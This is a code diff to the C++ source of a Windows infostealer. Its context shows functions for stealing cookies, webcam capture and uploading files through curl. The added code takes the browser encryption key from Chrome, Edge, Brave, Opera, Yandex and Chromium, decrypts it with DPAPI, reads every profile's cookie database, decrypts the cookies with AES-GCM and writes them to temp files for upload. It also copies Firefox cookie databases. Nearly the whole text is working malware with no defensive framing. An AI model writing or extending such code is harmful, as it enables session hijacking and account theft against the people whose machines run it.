@@ -15,6 +15,7 @@
 #include <gdiplus.h>
 #include <ShlObj.h>
 #include <intrin.h>
+#include <bcrypt.h>
 #include "config.h"
 #include "curl/curl.h"
 
@@ -28,6 +29,8 @@
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "libcurl.lib")
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "crypt32.lib")
 
 // libcurl write callback
 static size_t curl_write_cb(void* ptr, size_t sz, size_t nmemb, void* ud) {
@@ -105,7 +108,7 @@ void simple_upload()
 
     wchar_t tmpDir[MAX_PATH];
     GetTempPathW(MAX_PATH, tmpDir);
-    const wchar_t* patterns[] = { L"cookies_*", L"history_*", L"localstate_*" };
+    const wchar_t* patterns[] = { L"cookies_*", L"history_*" };
     for (auto* pat : patterns) {
         wchar_t search[MAX_PATH];
         swprintf_s(search, L"%s\\%s", tmpDir, pat);
@@ -1195,42 +1198,199 @@ void guarded_webcam()
     __try { capture_webcam(); } __except (EXCEPTION_EXECUTE_HANDLER) {}
 }
 
-void steal_cookies()
-{
+// --- SQLite3 (winsqlite3.dll, Windows 10+ built-in) ---
+typedef struct sqlite3 sqlite3;
+typedef struct sqlite3_stmt sqlite3_stmt;
+typedef int(*sqlite3_open_t)(const char*, sqlite3**);
+typedef int(*sqlite3_close_t)(sqlite3*);
+typedef int(*sqlite3_prepare_v2_t)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
+typedef int(*sqlite3_step_t)(sqlite3_stmt*);
+typedef int(*sqlite3_column_count_t)(sqlite3_stmt*);
+typedef const unsigned char*(*sqlite3_column_text_t)(sqlite3_stmt*, int);
+typedef const void*(*sqlite3_column_blob_t)(sqlite3_stmt*, int);
+typedef int(*sqlite3_column_bytes_t)(sqlite3_stmt*, int);
+typedef int(*sqlite3_finalize_t)(sqlite3_stmt*);
+static struct { sqlite3_open_t open; sqlite3_close_t close; sqlite3_prepare_v2_t prepare_v2; sqlite3_step_t step; sqlite3_column_count_t column_count; sqlite3_column_text_t column_text; sqlite3_column_blob_t column_blob; sqlite3_column_bytes_t column_bytes; sqlite3_finalize_t finalize; } sql;
+
+static bool sqlite3_init() {
+    static bool done, ok;
+    if (done) return ok; done = true;
+    HMODULE dll = LoadLibraryW(L"winsqlite3.dll");
+    if (!dll) return ok = false;
+    #define LOAD(fn) if (!(sql.fn = (sqlite3_##fn##_t)GetProcAddress(dll, "sqlite3_" #fn))) { FreeLibrary(dll); return ok = false; }
+    LOAD(open); LOAD(close); LOAD(prepare_v2); LOAD(step);
+    LOAD(column_count); LOAD(column_text); LOAD(column_blob); LOAD(column_bytes); LOAD(finalize);
+    #undef LOAD
+    return ok = true;
+}
+
+// Base64 decode using Win32 CryptStringToBinaryA
+static std::vector<BYTE> b64decode(const char* b64, size_t len) {
+    DWORD outLen = 0;
+    CryptStringToBinaryA(b64, (DWORD)len, CRYPT_STRING_BASE64, nullptr, &outLen, nullptr, nullptr);
+    std::vector<BYTE> out(outLen);
+    CryptStringToBinaryA(b64, (DWORD)len, CRYPT_STRING_BASE64, out.data(), &outLen, nullptr, nullptr);
+    return out;
+}
+
+// Extract & decrypt AES key from Local State JSON (DPAPI → raw AES-256 key)
+static std::vector<BYTE> extract_aes_key(const wchar_t* localStatePath) {
+    std::vector<BYTE> key;
+    HANDLE h = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return key;
+    DWORD sz = GetFileSize(h, nullptr);
+    if (!sz || sz > 1048576) { CloseHandle(h); return key; }
+    std::string data(sz, '\0');
+    DWORD rd; ReadFile(h, &data[0], sz, &rd, nullptr); CloseHandle(h);
+
+    // find "encrypted_key":"...
+    const char* tag = "\"encrypted_key\":\"";
+    auto pos = data.find(tag);
+    if (pos == std::string::npos) return key;
+    pos += strlen(tag);
+    auto end = data.find('"', pos);
+    if (end == std::string::npos) return key;
+
+    // Base64 decode → strip "DPAPI" (5 bytes) → CryptUnprotectData
+    auto blob = b64decode(data.c_str() + pos, end - pos);
+    if (blob.size() <= 5) return key;
+
+    DATA_BLOB in = { (DWORD)blob.size() - 5, blob.data() + 5 }, out = {};
+    if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
+        key.assign(out.pbData, out.pbData + out.cbData);
+        LocalFree(out.pbData);
+    }
+    return key;
+}
+
+// AES-256-GCM decrypt via BCrypt
+static std::vector<BYTE> aes_gcm_decrypt(const BYTE* key, size_t keyLen, const BYTE* nonce, size_t nonceLen, const BYTE* ct, size_t ctLen) {
+    std::vector<BYTE> pt(ctLen);
+    BCRYPT_ALG_HANDLE hAlg = nullptr;
+    BCRYPT_KEY_HANDLE hKey = nullptr;
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
+    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, (ULONG)keyLen, 0) != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return {}; }
+
+    // Chromium format: nonce(12) || ciphertext || tag(16)
+    size_t dataLen = ctLen - nonceLen - 16;
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth = {};
+    BCRYPT_INIT_AUTH_MODE_INFO(auth);
+    auth.pbNonce = (PUCHAR)nonce;
+    auth.cbNonce = (ULONG)nonceLen;
+    auth.pbTag = (PUCHAR)(ct + nonceLen + dataLen);
+    auth.cbTag = 16;
+
+    ULONG outLen = 0;
+    BCryptDecrypt(hKey, (PUCHAR)(ct + nonceLen), (ULONG)dataLen, &auth, nullptr, 0, pt.data(), (ULONG)dataLen, &outLen, 0);
+    pt.resize(outLen);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    return pt;
+}
+
+// Decrypt one Chromium browser's cookies — supports multiple profiles
+static void decrypt_chromium(const wchar_t* name, const wchar_t* basePath, int type, const wchar_t* outDir) {
+    wchar_t lsPath[MAX_PATH], dbPath[MAX_PATH];
     wchar_t localAppData[MAX_PATH], roamingAppData[MAX_PATH];
     SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
     SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);
 
-    struct { const wchar_t* name; const wchar_t* base; int type; const wchar_t* sub; } browsers[] = {
-        {L"Chrome",  L"Google\\Chrome\\User Data",              0, L"Default\\Network\\Cookies"},
-        {L"Edge",    L"Microsoft\\Edge\\User Data",              0, L"Default\\Network\\Cookies"},
-        {L"Brave",   L"BraveSoftware\\Brave-Browser\\User Data", 0, L"Default\\Network\\Cookies"},
-        {L"Opera",   L"Opera Software\\Opera Stable",            1, L"Network\\Cookies"},
-        {L"Yandex",  L"Yandex\\YandexBrowser\\User Data",       0, L"Default\\Network\\Cookies"},
-        {L"Chromium",L"Chromium\\User Data",                     0, L"Default\\Network\\Cookies"},
-    };
+    const wchar_t* userData = type == 0 ? localAppData : roamingAppData;
+    swprintf_s(lsPath, L"%s\\%s\\Local State", userData, basePath);
+    swprintf_s(dbPath, L"%s\\%s", userData, basePath);
+
+    auto aesKey = extract_aes_key(lsPath);
+    if (aesKey.empty()) return;
+
+    // scan for profile directories containing Cookies
+    wchar_t searchPath[MAX_PATH];
+    swprintf_s(searchPath, L"%s\\*", dbPath);
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW(searchPath, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
+        if (fd.cFileName[0] == L'.') continue;
+
+        // look for Cookies DB (try Network\Cookies first, then Cookies)
+        wchar_t cookiePath[MAX_PATH] = {};
+        swprintf_s(cookiePath, L"%s\\%s\\Network\\Cookies", dbPath, fd.cFileName);
+        if (GetFileAttributesW(cookiePath) == INVALID_FILE_ATTRIBUTES)
+            swprintf_s(cookiePath, L"%s\\%s\\Cookies", dbPath, fd.cFileName);
+        if (GetFileAttributesW(cookiePath) == INVALID_FILE_ATTRIBUTES) continue;
+
+        char cp_u8[MAX_PATH];
+        WideCharToMultiByte(CP_UTF8, 0, cookiePath, -1, cp_u8, sizeof(cp_u8), nullptr, nullptr);
+
+        sqlite3* s3 = nullptr; sqlite3_stmt* stmt = nullptr;
+        if (sql.open(cp_u8, &s3)) continue;
+
+        const char* q = "SELECT host_key,name,encrypted_value,path FROM cookies";
+        if (sql.prepare_v2(s3, q, -1, &stmt, nullptr)) { sql.close(s3); continue; }
+
+        wchar_t outPath[MAX_PATH];
+        swprintf_s(outPath, L"%s\\cookies_%s_%s.txt", outDir, name, fd.cFileName);
+
+        HANDLE hOut = CreateFileW(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hOut != INVALID_HANDLE_VALUE) {
+            DWORD w;
+            const char* hdr = "# host\tname\tvalue\tpath\r\n";
+            WriteFile(hOut, hdr, (DWORD)strlen(hdr), &w, nullptr);
+
+            while (sql.step(stmt) == 100/*SQLITE_ROW*/) {
+                const char* host = (const char*)sql.column_text(stmt, 0);
+                const char* cname = (const char*)sql.column_text(stmt, 1);
+                const void* encVal = sql.column_blob(stmt, 2);
+                int encLen = sql.column_bytes(stmt, 2);
+                const char* path = (const char*)sql.column_text(stmt, 3);
+
+                if (!host || !cname || !encVal || encLen <= 15) continue;
+
+                // skip "v10"/"v20" prefix (3 bytes)
+                const BYTE* raw = (const BYTE*)encVal + 3;
+                size_t rawLen = encLen - 3;
+
+                auto pt = aes_gcm_decrypt(aesKey.data(), aesKey.size(), raw, 12, raw, rawLen);
+                if (pt.empty()) continue;
+
+                char line[8192];
+                int l = sprintf_s(line, "%s\t%s\t%.*s\t%s\r\n",
+                    host, cname, (int)pt.size(), (const char*)pt.data(),
+                    path ? path : "/");
+                WriteFile(hOut, line, l, &w, nullptr);
+            }
+            CloseHandle(hOut);
+        }
+        sql.finalize(stmt);
+        sql.close(s3);
+    } while (FindNextFileW(hFind, &fd));
+    FindClose(hFind);
+}
+
+void steal_cookies()
+{
+    if (!sqlite3_init()) return;
 
     wchar_t outDir[MAX_PATH];
     GetTempPathW(MAX_PATH, outDir);
 
-    for (auto& b : browsers) {
-        wchar_t src[MAX_PATH];
-        swprintf_s(src, L"%s\\%s\\%s",
-            b.type == 0 ? localAppData : roamingAppData, b.base, b.sub);
-        wchar_t dst[MAX_PATH];
-        swprintf_s(dst, L"%s\\cookies_%s.db", outDir, b.name);
-        CopyFileW(src, dst, FALSE);
+    // Chromium browsers — decrypt locally
+    struct { const wchar_t* name; const wchar_t* base; int type; } browsers[] = {
+        {L"Chrome",  L"Google\\Chrome\\User Data",              0},
+        {L"Edge",    L"Microsoft\\Edge\\User Data",              0},
+        {L"Brave",   L"BraveSoftware\\Brave-Browser\\User Data", 0},
+        {L"Opera",   L"Opera Software\\Opera Stable",            1},
+        {L"Yandex",  L"Yandex\\YandexBrowser\\User Data",       0},
+        {L"Chromium",L"Chromium\\User Data",                     0},
+    };
+    for (auto& b : browsers)
+        decrypt_chromium(b.name, b.base, b.type, outDir);
 
-        // also steal Local State (encryption key)
-        wchar_t lsSrc[MAX_PATH];
-        swprintf_s(lsSrc, L"%s\\%s\\Local State",
-            b.type == 0 ? localAppData : roamingAppData, b.base);
-        wchar_t lsDst[MAX_PATH];
-        swprintf_s(lsDst, L"%s\\localstate_%s.json", outDir, b.name);
-        CopyFileW(lsSrc, lsDst, FALSE);
-    }
-
-    // Firefox — cookies.sqlite in profile folders
+    // Firefox — cookies.sqlite is NOT encrypted, just copy as-is
+    wchar_t roamingAppData[MAX_PATH];
+    SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);
     wchar_t ffBase[MAX_PATH];
     swprintf_s(ffBase, L"%s\\Mozilla\\Firefox\\Profiles", roamingAppData);
     wchar_t ffSearch[MAX_PATH];
@@ -1241,9 +1401,8 @@ void steal_cookies()
         do {
             if (fd.cFileName[0] == L'.') continue;
             if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
-            wchar_t src[MAX_PATH];
+            wchar_t src[MAX_PATH], dst[MAX_PATH];
             swprintf_s(src, L"%s\\%s\\cookies.sqlite", ffBase, fd.cFileName);
-            wchar_t dst[MAX_PATH];
             swprintf_s(dst, L"%s\\cookies_Firefox_%s.db", outDir, fd.cFileName);
             CopyFileW(src, dst, FALSE);
         } while (FindNextFileW(hFind, &fd));
